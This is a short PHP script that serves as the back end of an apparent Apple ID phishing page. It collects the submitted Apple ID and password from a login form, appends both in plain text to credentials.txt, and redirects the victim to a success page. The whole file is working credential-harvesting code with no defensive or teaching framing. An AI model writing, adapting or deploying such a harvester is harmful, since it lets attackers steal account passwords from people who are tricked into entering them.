<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted form data
    $apple_id = htmlspecialchars($_POST['apple-id']);
    $password = htmlspecialchars($_POST['password']);

    // Save the credentials to a file (credentials.txt)
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Apple ID: " . $apple_id . " | Password: " . $password . "\n");
    fclose($file);

    // Redirect to a success page or back to the login page
    header("Location: success.html");
    exit();
}
?>
